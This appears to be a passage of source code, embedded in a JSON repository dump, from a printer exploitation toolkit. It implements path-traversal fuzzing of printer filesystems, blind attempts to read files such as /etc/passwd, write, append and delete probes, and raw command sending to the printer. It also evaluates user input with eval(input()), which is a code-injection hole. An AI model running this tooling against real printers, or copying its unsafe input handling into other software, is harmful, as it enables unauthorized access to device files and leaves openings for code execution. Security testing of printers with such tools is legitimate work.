output().raw(\"Checking base paths first.\")\n        # get a cup of coffee, fuzzing will take some time\n        output().fuzzed(\"PATH\", \"\", (\"\", \"EXISTS\", \"DIRLIST\"))\n        output().hline()\n        found = {}  # paths found\n        # try base paths first\n        for path in self.vol_exists() + fuzzer().path:\n            self.verify_path(path, found)\n        output().raw(\"Checking filesystem hierarchy standard.\")\n        # try direct access to fhs dirs\n        for path in fuzzer().fhs:\n            self.verify_path(path)\n        # try path traversal strategies\n        if found:\n            output().raw(\"Now checking traversal strategies.\")\n            output().fuzzed(\"PATH\", \"\", (\"\", \"EXISTS\", \"DIRLIST\"))\n            output().hline()\n            # only check found volumes\n            for vol in found:\n                sep = \"\" if vol[-1:] in [\"\", \"/\", \"\\\\\"] else \"/\"\n                sep2 = vol[-1:] if vol[-1:] in [\"/\", \"\\\\\"] else \"/\"\n                # 1st level traversal\n                for dir in fuzzer().dir:\n                    path = vol + sep + dir + sep2\n                    self.verify_path(path)\n                    # 2nd level traversal\n                    for dir2 in fuzzer().dir:\n                        path = vol + sep + dir + sep2 + dir2 + sep2\n                        self.verify_path(path)\n\n    def fuzz_write(self):\n        output().raw(\"Writing temporary files.\")\n        # get a cup of tea, fuzzing will take some time\n        output().fuzzed(\"PATH\", \"COMMAND\", (\"GET\", \"EXISTS\", \"DIRLIST\"))\n        output().hline()\n        # test data to put/append\n        data = \"test\"\n        data2 = \"test2\"\n        # try write to disk strategies\n        for vol in self.vol_exists() + fuzzer().write:\n            sep = \"\" if vol[-1:] in [\"\", \"/\", \"\\\\\"] else \"/\"\n            name = \"dat\" + str(random.randrange(10000))\n            # FSDOWNLOAD\n            self.put(vol + sep + name, data)\n            fsd_worked = self.verify_write(vol + sep, name, data, \"PUT\")\n            # FSAPPEND\n            self.append(vol + sep + name, data2)\n            data = (data + data2) if fsd_worked else data2\n            self.verify_write(vol + sep, name, data, \"APPEND\")\n            # FSDELETE\n            self.do_delete(vol + sep + name)\n            output().hline()\n\n    def fuzz_blind(self):\n        output().raw(\"Blindly trying to read files.\")\n        # get a bottle of beer, fuzzing will take some time\n        output().fuzzed(\"PATH\", \"\", (\"\", \"GET\", \"EXISTS\"))\n        output().hline()\n        # try blind file access strategies (relative path)\n        for path in fuzzer().rel:\n            self.verify_blind(path, \"\")\n        output().hline()\n        # try blind file access strategies (absolute path)\n        for vol in self.vol_exists() + fuzzer().blind:\n            sep = \"\" if vol[-1:] in [\"\", \"/\", \"\\\\\"] else \"/\"\n            sep2 = vol[-1:] if vol[-1:] in [\"/\", \"\\\\\"] else \"/\"\n            # filenames to look for\n            for file in fuzzer().abs:\n                # set current delimiter\n                if isinstance(file, list):\n                    file = sep2.join(file)\n                path = vol + sep\n                self.verify_blind(path, file)\n                # vol name out of range error\n                if self.error == \"30054\":\n                    output().raw(\"Volume nonexistent, skipping.\")\n                    break\n                # no directory traversal\n                for dir in fuzzer().dir:\n                    # n'th level traversal\n                    for n in range(1, 3):\n                        path = vol + sep + n * (dir + sep2)\n                        self.verify_blind(path, file)\n\n    # check for path traversal\n    def verify_path(self, path, found={}):\n        # 1st method: EXISTS\n        opt1 = self.dir_exists(path) or False\n        # 2nd method: DIRLIST\n        dir2 = self.dirlist(path, False)\n        opt2 = True if dir2 else False\n        # show fuzzing results\n        output().fuzzed(path, \"\", (\"\", opt1, opt2))\n        if opt2:  # DIRLIST successful\n            # add path if not already listed\n            if dir2 not in list(found.values()):\n                found[path] = dir2\n                output().raw(\"Listing directory.\")\n                self.do_ls(path)\n        elif opt1:  # only EXISTS successful\n            found[path] = None\n\n    # check for remote files (write)\n    def verify_write(self, path, name, data, cmd):\n        # 1st method: GET\n        opt1 = data in self.get(path + name, len(data))[1]\n        # 2nd method: EXISTS\n        opt2 = self.file_exists(path + name) != c.NONEXISTENT\n        # 3rd method: DIRLIST\n        opt3 = name in self.dirlist(path, False)\n        # show fuzzing results\n        output().fuzzed(path + name, cmd, (opt1, opt2, opt3))\n        return opt1\n\n    # check for remote files (blind)\n    def verify_blind(self, path, name):\n        # 1st method: GET\n        opt1 = self.get(path + name, 10)[1]  # file size is unknown :/\n        opt1 = True if opt1 and not \"FILEERROR\" in opt1 else False\n        # 2nd method: EXISTS\n        opt2 = self.file_exists(path + name) != c.NONEXISTENT\n        # show fuzzing results\n        output().fuzzed(path + name, \"\", (\"\", opt1, opt2))\n\n    def help_fuzz(self):\n        print(\"File system fuzzing:  fuzz <category>\")\n        print(\"  fuzz path   - Explore fs structure with path traversal strategies.\")\n        print(\"  fuzz write  - First put/append file, then check for its existence.\")\n        print(\"  fuzz blind  - Read-only tests for existing files like /etc/passwd.\")\n\n    options_fuzz = (\"path\", \"write\", \"blind\")\n\n    def complete_fuzz(self, text, line, begidx, endidx):\n        return [cat for cat in self.options_fuzz if cat.startswith(text)]\n\n    # ====================================================================\n\n    # ------------------------[ site <command> ]--------------------------\n    def do_site(self, arg):\n        \"Execute custom command on printer:  site <command>\"\n        if not arg:\n            arg = eval(input(\"Command: \"))\n        str_recv = self.cmd(arg)\n        output().info(str_recv)\n\n    # ------------------------[ print <file>|\"text\" ]----------------------------\n    def do_print(self, arg):\n        'Print image file or raw text:  print <file>|\"text\"'\n        \"\"\"\n    ┌──────────────────────────────────────────────────────────┐\n    │ Poor man's driverless printing (PCL based, experimental) │\n    └──────────────────────────────────────────────────────────┘\n    \"\"\"\n        if not arg:\n            arg = eval(input('File or \"text\": '))\n        if arg.startswith('\"'):\n            data = arg.strip('\"')  # raw text string\n        elif arg.endswith(\".ps\"):\n            data = file().read(arg)  # postscript file\n        else:\n            data = self.convert(arg, \"pcl\")  # anything else…\n            data = c.UEL.encode() + data + c.UEL.encode()\n        if data:\n            self.send(data)  # send pcl datastream to printer\n        print(\"H\")\n\n    # convert image to page description language\n    def convert(self, path, pdl=\"pcl\"):\n        \"\"\"\n        ┌──────────────────────────────────────────────────────────┐\n        │ Warning: ImageMagick and Ghostscript are used to convert │\n        │ the document to be printed into a language understood be │\n        │ the printer. Don't print anything from untrusted sources │\n        │ as it may be a security risk (CVE-2016–3714, 2016-7976). │\n        └──────────────────────────────────────────────────────────┘\n        \"\"\"\n        try:\n            self.chitchat(\"Converting '\" + path + \"' to \" + pdl + \" format\")\n            pdf = [\"-density\", \"300\"] if path.endswith(\".pdf\") else []\n            cmd = [\"convert\"] + pdf + [path, \"-quality\", \"100\", pdl + \":-\"]\n            out, err = subprocess.PIPE, subprocess.PIPE\n            p = subprocess.Popen(cmd, stdout=out, stderr=err)\n            data, stderr = p.communicate()\n        except:\n            stderr = \"ImageMagick or Ghostscript missing\"\n        if stderr:\n            output().errmsg(\"Cannot convert\", stderr)\n        else:\n            return data\n"
        },
        {
          "name": "testpages",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}